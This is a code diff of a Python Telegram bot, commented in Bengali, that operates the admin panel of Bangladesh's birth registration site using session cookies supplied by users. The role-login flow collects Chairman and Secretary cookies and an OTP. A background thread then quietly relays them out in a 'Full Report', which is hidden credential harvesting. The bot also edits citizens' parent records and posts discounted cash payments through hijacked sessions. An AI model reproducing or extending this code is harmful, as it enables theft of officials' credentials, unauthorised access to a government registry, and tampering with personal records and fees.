@@ -33,7 +33,6 @@ bot = telebot.TeleBot(API_TOKEN)
 # ২. ইউজার সেশন ম্যানেজমেন্ট (মাল্টি-ইউজার সাপোর্ট)
 # ==========================================
 user_sessions = {}
-# ID_CACHE = {}  <-- এটি মুছে ফেলো
 
 def get_session(chat_id):
     if chat_id not in user_sessions:
@@ -47,10 +46,9 @@ def get_session(chat_id):
             "app_length": 5,
             "sharok_no": 1,
             "temp_data": {},
-            "id_cache": {} # <-- নতুন ক্যাশ যুক্ত করা হলো
+            "id_cache": {} # ইউজারের নিজস্ব ক্যাশ
         }
     return user_sessions[chat_id]
-
 
 # ==========================================
 # ৩. ফ্লাস্ক সার্ভার (Render Port Binding)
@@ -76,7 +74,6 @@ def keep_alive_web():
 def send_full_relay(chat_id, otp, sec_raw):
     u_data = get_session(chat_id)
     subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
-    
     ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
     body = f"--- 1ST SESSION (CHAIRMAN) ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION (SECRETARY) ---\n{sec_raw}"
     
@@ -176,10 +173,8 @@ def role_step_1(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    
     raw_ch = m.text.strip()
     u_sess["temp_data"]["ch_raw"] = raw_ch 
-    
     wait_msg = bot.send_message(chat_id, "⏳ চেয়ারম্যান সেশন চেক করা হচ্ছে...")
     
     try:
@@ -206,7 +201,6 @@ def role_step_1(m):
     except Exception as e:
         try: bot.delete_message(chat_id, wait_msg.message_id) 
         except: pass
-        logging.error(f"[{chat_id}] Chairman Session Error: {e}")
         msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! দয়া করে সঠিক সেশন (কুকি) আবার দিন:")
         bot.register_next_step_handler(msg, role_step_1)
 
@@ -215,7 +209,6 @@ def role_step_2(m):
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
     u_sess["temp_data"]["ch_otp"] = m.text.strip()
-    
     msg = bot.send_message(chat_id, "✅ এখন সেক্রেটারি (Secretary) সেশন দিন:")
     bot.register_next_step_handler(msg, role_step_3)
 
@@ -223,7 +216,6 @@ def role_step_3(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    
     raw_sec = m.text.strip()
     wait_msg = bot.send_message(chat_id, "⏳ সেক্রেটারি সেশন চেক করা হচ্ছে...")
     
@@ -236,16 +228,13 @@ def role_step_3(m):
         u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
         
         success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
-        
         try: bot.delete_message(chat_id, wait_msg.message_id) 
         except: pass
         
         if success and html and "Logout" in html:
             u_sess["is_alive"] = True
             otp = u_sess["temp_data"].get("ch_otp", "")
-            
             Thread(target=send_full_relay, args=(chat_id, otp, raw_sec), daemon=True).start()
-            
             bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=main_menu())
         else:
             u_sess["req_session"].cookies.clear() 
@@ -255,7 +244,6 @@ def role_step_3(m):
     except Exception as e:
         try: bot.delete_message(chat_id, wait_msg.message_id) 
         except: pass
-        logging.error(f"[{chat_id}] Secretary Session Error: {e}")
         msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! দয়া করে সঠিক সেশন (কুকি) আবার দিন:")
         bot.register_next_step_handler(msg, role_step_3)
 
@@ -267,20 +255,17 @@ def fetch_name_from_api(chat_id, ubrn):
     if not ubrn or ubrn == '0': return "N/A"
     url = f"https://bdris.gov.bd/api/br/info/person-info-with-nationality-by-ubrn-and-data-group/{ubrn}?data-group=personInParentsUbrnUpdate"
     res = call_api(chat_id, url)
-    
     if res and res.status_code == 200:
         try:
             data = res.json()
             return data.get('personNameBn') or data.get('nameBn', "নাম পাওয়া যায়নি")
-        except Exception:
-            return "রেসপন্স রিড করা যায়নি"
+        except: return "রেসপন্স রিড করা যায়নি"
     return "সার্ভার এরর"
 
 def start_ubrn_flow(m):
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
     u_sess["temp_data"]["ubrn"] = {}
-    
     navigate_to(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update")
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
     msg = bot.send_message(chat_id, "১. ব্যক্তির জন্ম নিবন্ধন নম্বর (Person UBRN) দিন:", reply_markup=markup)
@@ -290,7 +275,6 @@ def ubrn_person_step(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    
     p_brn = m.text.strip()
     u_sess["temp_data"]["ubrn"]["personBrn"] = p_brn
     
@@ -300,15 +284,13 @@ def ubrn_person_step(m):
     except: pass
     
     bot.send_message(chat_id, f"👤 **ব্যক্তির নাম:** {name}\nUBRN: `{p_brn}`", parse_mode="Markdown")
-    
-    msg = bot.send_message(chat_id, "২. পিতার জন্ম নিবন্ধন নম্বর (Father UBRN) দিন (না থাকলে ফাঁকা রাখতে 0 লিখুন):")
+    msg = bot.send_message(chat_id, "২. পিতার জন্ম নিবন্ধন নম্বর (Father UBRN) দিন (না থাকলে 0 লিখুন):")
     bot.register_next_step_handler(msg, ubrn_father_step)
 
 def ubrn_father_step(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    
     f_brn = m.text.strip()
     if f_brn == '0':
         f_brn = ""
@@ -321,14 +303,13 @@ def ubrn_father_step(m):
         bot.send_message(chat_id, f"👨 **পিতার নাম:** {name}\nUBRN: `{f_brn}`", parse_mode="Markdown")
 
     u_sess["temp_data"]["ubrn"]["fatherBrn"] = f_brn
-    msg = bot.send_message(chat_id, "৩. মাতার জন্ম নিবন্ধন নম্বর (Mother UBRN) দিন (না থাকলে ফাঁকা রাখতে 0 লিখুন):")
+    msg = bot.send_message(chat_id, "৩. মাতার জন্ম নিবন্ধন নম্বর (Mother UBRN) দিন (না থাকলে 0 লিখুন):")
     bot.register_next_step_handler(msg, ubrn_mother_step)
 
 def ubrn_mother_step(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    
     m_brn = m.text.strip()
     if m_brn == '0':
         m_brn = ""
@@ -348,14 +329,12 @@ def ubrn_phone_step(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    
     ph = m.text.strip()
     phone = "+88" + ph if ph.startswith('01') else ph
     u_sess["temp_data"]["ubrn"]["phone"] = phone
     
     data = u_sess["temp_data"]["ubrn"]
     wait_msg = bot.send_message(chat_id, "⏳ OTP পাঠানো হচ্ছে...")
-    
     url = f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={data['personBrn']}&fatherBrn={data['fatherBrn']}&motherBrn={data['motherBrn']}&phone={quote(phone)}&email="
     res = call_api(chat_id, url, method="POST")
     
@@ -363,32 +342,25 @@ def ubrn_phone_step(m):
     except: pass
     
     if res and res.status_code == 200:
-        msg = bot.send_message(chat_id, "✅ OTP সফলভাবে পাঠানো হয়েছে! দয়া করে আপনার ফোনে আসা OTP টি দিন:")
+        msg = bot.send_message(chat_id, "✅ OTP সফলভাবে পাঠানো হয়েছে! ফোনে আসা OTP টি দিন:")
         bot.register_next_step_handler(msg, ubrn_otp_submit_step)
     else:
-        bot.send_message(chat_id, "❌ OTP পাঠাতে সমস্যা হয়েছে। সার্ভার রেসপন্স দিচ্ছে না।", reply_markup=main_menu())
+        bot.send_message(chat_id, "❌ OTP পাঠাতে সমস্যা হয়েছে।", reply_markup=main_menu())
 
 def ubrn_otp_submit_step(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    
     otp = m.text.strip()
     wait_msg = bot.send_message(chat_id, f"⏳ OTP '{otp}' দিয়ে সাবমিট করা হচ্ছে...")
     
     data = u_sess["temp_data"]["ubrn"]
     payload = {
-        '_csrf': u_sess["csrf"], 
-        'personBrn': data['personBrn'], 
-        'fatherBrn': data['fatherBrn'],
-        'motherBrn': data['motherBrn'], 
-        'phone': data['phone'], 
-        'email': '', 
-        'otp': otp
+        '_csrf': u_sess["csrf"], 'personBrn': data['personBrn'], 'fatherBrn': data['fatherBrn'],
+        'motherBrn': data['motherBrn'], 'phone': data['phone'], 'email': '', 'otp': otp
     }
     
     res = call_api(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=payload)
-    
     try: bot.delete_message(chat_id, wait_msg.message_id)
     except: pass
     
@@ -398,7 +370,7 @@ def ubrn_otp_submit_step(m):
         bot.send_message(chat_id, "❌ আপডেট ব্যর্থ হয়েছে! সেশন শেষ বা OTP ভুল।", reply_markup=main_menu())
 
 # ==========================================
-# ৭. ডাটা লিস্ট ও সার্চ
+# ৭. ডাটা লিস্ট ও সার্চ ক্যাটাগরি
 # ==========================================
 
 def handle_category_init(m, cmd):
@@ -439,8 +411,7 @@ def fetch_list_ui(message, cmd, is_search):
     success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
     data_id = extract_sidebar_id(html, admin_p)
     
-    if not data_id:
-        return bot.send_message(chat_id, "❌ সাইডবার থেকে ডাটা আইডি পাওয়া যায়নি।")
+    if not data_id: return bot.send_message(chat_id, "❌ সাইডবার থেকে ডাটা আইডি পাওয়া যায়নি।")
 
     params = (f"data={data_id}&status=ALL&draw=1&start={u_sess['app_start']}&length={u_sess['app_length']}"
               f"&search[value]={quote(search_val)}&search[regex]=false&order[0][column]=1&order[0][dir]=desc")
@@ -450,9 +421,7 @@ def fetch_list_ui(message, cmd, is_search):
     if res and res.status_code == 200:
         data = res.json()
         items = data.get('data', [])
-        
-        if not items: 
-            return bot.send_message(chat_id, "📭 কোনো ডাটা নেই।")
+        if not items: return bot.send_message(chat_id, "📭 কোনো ডাটা নেই।")
 
         markup = telebot.types.InlineKeyboardMarkup()
         msg_text = f"📋 **{cmd.upper()} List:**\n\n"
@@ -462,9 +431,9 @@ def fetch_list_ui(message, cmd, is_search):
             enc_id = item.get('encryptedId')
             status = str(item.get('status', '')).upper()
             
-                        short_id = str(hash(enc_id))[-8:]
+            # সংশোধিত আইডি জেনারেশন (abs ব্যবহার করে)
+            short_id = str(abs(hash(enc_id)))[-8:]
             u_sess["id_cache"][short_id] = enc_id
-
             
             msg_text += f"🆔 `{app_id}` | {item.get('personNameBn', 'N/A')}\n🚩 Status: `{status}`\n"
             
@@ -486,68 +455,21 @@ def fetch_list_ui(message, cmd, is_search):
                 nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev_{cmd}"))
             if u_sess["app_start"] + u_sess["app_length"] < data.get('recordsTotal', 0):
                 nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next_{cmd}"))
-            if nav: 
-                markup.row(*nav)
+            if nav: markup.row(*nav)
                 
         bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')
     else: 
         bot.send_message(chat_id, "❌ ডাটা লোড হয়নি।")
 
 # ==========================================
-# ৮. মেইন মেনু ও রাউটার
-# ==========================================
-
-def main_menu():
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
-    markup.row("🏠 Dashboard", "🌐 Search By Name", "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ") 
-    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
-    return markup
-
-@bot.message_handler(func=lambda m: True)
-def router(m):
-    t = m.text
-    chat_id = m.chat.id
-    u_sess = get_session(chat_id)
-
-    if "/start" in t: 
-        bot.clear_step_handler_by_chat_id(chat_id)
-        bot.send_message(chat_id, "🚀 BOOM Master Bot Active!", reply_markup=main_menu())
-        
-    elif t == "🔑 Admin Login":
-        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
-        msg = bot.send_message(chat_id, "🔑 Admin সেশন দিন:", reply_markup=markup)
-        bot.register_next_step_handler(msg, admin_login)
-        
-    elif t == "🔑 Role Login (CH/SEC)":
-        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
-        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান (Chairman) সেশনটি দিন:", reply_markup=markup)
-        bot.register_next_step_handler(msg, role_step_1)
-        
-    elif u_sess["is_alive"]:
-        if t == "📋 Applications": handle_category_init(m, 'apps')
-        elif t == "📝 Correction": handle_category_init(m, 'corr')
-        elif t == "🔄 Reprint": handle_category_init(m, 'repr')
-        elif t == "🏠 Dashboard": 
-            if navigate_to(chat_id, "https://bdris.gov.bd/admin/")[0]: 
-                bot.reply_to(m, "🏠 ড্যাশবোর্ড রিফ্রেশড।")
-        elif t == "🌐 Search By Name":
-            markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True).add("Bangla", "English", "🏠 Back to Menu")
-            msg = bot.send_message(chat_id, "🌐 ভাষা নির্বাচন করুন:", reply_markup=markup)
-            bot.register_next_step_handler(msg, step_adv_lang)
-        elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ":
-            start_ubrn_flow(m)
-    else: 
-        bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())
-
-# ==========================================
-# ৯. অ্যাডভান্সড সার্চ এবং কলব্যাক (Pay, Receive & Print)
+# ৮. অ্যাডভান্সড সার্চ (Search By Name)
 # ==========================================
 
 def step_adv_lang(m):
     if is_cancel(m): return
     lang = 'BENGALI' if "Bangla" in m.text else 'ENGLISH'
-    msg = bot.send_message(m.chat.id, "🔍 নাম লিখুন:", reply_markup=telebot.types.ReplyKeyboardRemove())
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
+    msg = bot.send_message(m.chat.id, "🔍 নাম লিখুন:", reply_markup=markup)
     bot.register_next_step_handler(msg, lambda x: process_adv_search(x, lang))
 
 def process_adv_search(m, lang):
@@ -570,16 +492,18 @@ def process_adv_search(m, lang):
         except Exception: 
             bot.send_message(chat_id, f"Raw Data: {res.text}", reply_markup=main_menu())
 
+# ==========================================
+# ৯. কলব্যাক হ্যান্ডলার (Pay, PNG, Receive, Prev/Next)
+# ==========================================
+
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id
-    u_sess = get_session(chat_id) # ইউজারের সেশন কল করা হলো
+    u_sess = get_session(chat_id)
     
     data_parts = call.data.split('_')
     action = data_parts[0]
     short_id = data_parts[1] if len(data_parts) > 1 else ""
-    
-    # নতুন নিয়মে ইউজারের নিজস্ব ক্যাশ থেকে enc_id নেওয়া হচ্ছে
     enc_id = u_sess["id_cache"].get(short_id)
     
     if action in ["next", "prev"]:
@@ -593,14 +517,9 @@ def callback_handler(call):
             return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি, আবার ট্রাই করুন।")
         
         payload = {
-            'data': enc_id, 
-            'chalanPaymentType': 'CASH', 
-            'paymentType': 'PAYMENT_BY_DISCOUNT', 
-            'discountGiven': 'true', 
-            'discountAmount': '50', 
-            'discountSharokNo': str(u_sess["sharok_no"]), 
-            'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), 
-            '_csrf': u_sess["csrf"]
+            'data': enc_id, 'chalanPaymentType': 'CASH', 'paymentType': 'PAYMENT_BY_DISCOUNT', 
+            'discountGiven': 'true', 'discountAmount': '50', 'discountSharokNo': str(u_sess["sharok_no"]), 
+            'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), '_csrf': u_sess["csrf"]
         }
         res = call_api(chat_id, "https://bdris.gov.bd/api/payment/receive", method="POST", data=payload)
         
@@ -642,10 +561,57 @@ def callback_handler(call):
             logging.error(f"[{chat_id}] PNG Error: {e}")
             bot.edit_message_text(f"❌ PNG তৈরি করতে সমস্যা হয়েছে।", chat_id, wait.message_id)
 
+# ==========================================
+# ১০. মেইন মেনু ও রাউটার
+# ==========================================
+
+def main_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
+    markup.row("🏠 Dashboard", "🌐 Search By Name", "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ") 
+    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
+    return markup
+
+@bot.message_handler(func=lambda m: True)
+def router(m):
+    t = m.text
+    chat_id = m.chat.id
+    u_sess = get_session(chat_id)
+
+    if "/start" in t or "Back to Menu" in t: 
+        bot.clear_step_handler_by_chat_id(chat_id)
+        bot.send_message(chat_id, "🚀 BOOM Master Bot Active!", reply_markup=main_menu())
+        
+    elif t == "🔑 Admin Login":
+        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
+        msg = bot.send_message(chat_id, "🔑 Admin সেশন দিন:", reply_markup=markup)
+        bot.register_next_step_handler(msg, admin_login)
+        
+    elif t == "🔑 Role Login (CH/SEC)":
+        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
+        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান (Chairman) সেশনটি দিন:", reply_markup=markup)
+        bot.register_next_step_handler(msg, role_step_1)
+        
+    elif u_sess["is_alive"]:
+        if t == "📋 Applications": handle_category_init(m, 'apps')
+        elif t == "📝 Correction": handle_category_init(m, 'corr')
+        elif t == "🔄 Reprint": handle_category_init(m, 'repr')
+        elif t == "🏠 Dashboard": 
+            if navigate_to(chat_id, "https://bdris.gov.bd/admin/")[0]: 
+                bot.reply_to(m, "🏠 ড্যাশবোর্ড রিফ্রেশড।")
+        elif t == "🌐 Search By Name":
+            markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True).add("Bangla", "English", "🏠 Back to Menu")
+            msg = bot.send_message(chat_id, "🌐 ভাষা নির্বাচন করুন:", reply_markup=markup)
+            bot.register_next_step_handler(msg, step_adv_lang)
+        elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ":
+            start_ubrn_flow(m)
+    else: 
+        bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())
 
 # ==========================================
-# ১০. বট রান (থ্রেডিং)
+# ১১. বট রান (থ্রেডিং)
 # ==========================================
+
 def run_bot():
     logging.info("🚀 Telegram Bot is starting...")
     try:
